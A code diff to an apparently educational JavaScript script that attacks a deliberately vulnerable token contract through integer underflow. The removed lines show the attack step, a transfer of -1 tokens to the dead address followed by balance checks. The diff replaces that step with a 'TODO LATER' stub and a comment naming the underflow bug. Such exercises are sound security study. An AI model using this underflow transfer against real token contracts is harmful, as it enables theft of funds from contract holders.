@@ -7,9 +7,7 @@ const {
 
 /**
  * The objective is to get more tokens than intended.
- * For this, we need to use the fact that you can transfer a negative amount of tokens.
- * 1) Transfer -1000 tokens to the "dead address": 0x000000000000000000000000000000000000dEaD
- * 2) Verify the resulting balances
+ * For this, we need to use the underflow vulnerability when the contract performs a substraction.
  */
 
 async function performHack() {
@@ -18,7 +16,6 @@ async function performHack() {
     console.log("Retrieving contracts and hacker address...")
     let vulnerableContract, hacker
     const chainId = network.config.chainId
-    const deadAddress = "0x000000000000000000000000000000000000dEaD"
 
     if (developmentChains.includes(network.name)) {
         hacker = deployer // 20 tokens are sent to the deployer
@@ -51,14 +48,7 @@ async function showInitialInformation(vulnerableContract, hacker, deadAddress) {
 }
 
 async function attackStart(vulnerableContract, hacker, deadAddress) {
-    const tx = await vulnerableContract.transfer(deadAddress, -1)
-    await tx.wait(1)
-    const newHackerBalance = await vulnerableContract.balanceOf(hacker)
-    const newDeadAddressBalance = await vulnerableContract.balanceOf(
-        deadAddress
-    )
-    console.log(`New hacker's balance is ${newHackerBalance}`)
-    console.log(`New dead address balance is ${newDeadAddressBalance}`)
+    // TODO LATER
 }
 
 performHack()
